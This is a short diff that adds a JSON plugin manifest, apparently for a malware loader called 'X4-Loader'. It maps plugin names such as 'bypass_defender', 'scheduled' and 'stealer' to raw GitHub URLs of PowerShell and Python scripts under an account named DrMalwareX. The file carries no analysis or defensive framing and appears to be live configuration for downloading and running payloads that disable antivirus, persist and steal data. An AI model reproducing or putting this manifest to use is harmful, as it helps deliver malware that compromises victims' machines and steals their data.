@@ -1,0 +1,9 @@
+{"plugins":{
+    "antivirus" : "https://raw.githubusercontent.com/DrMalwareX/X4-Loader-Files/main/AntiVirus.ps1",
+    "bypass_defender":"https://raw.githubusercontent.com/DrMalwareX/X4-Loader-Files/main/BypassDefender.ps1",
+    "bypassed_defender":"https://raw.githubusercontent.com/DrMalwareX/X4-Loader-Files/main/BypassedDefender.ps1",
+    "scheduled":"https://raw.githubusercontent.com/DrMalwareX/X4-Loader-Files/main/Scheduled.ps1",
+    "stealer":"https://raw.githubusercontent.com/DrMalwareX/X4-Loader-Files/main/Stealer.py",
+    "test":"https://raw.githubusercontent.com/DrMalwareX/X4-Loader-Files/main/test.py"
+    }
+}
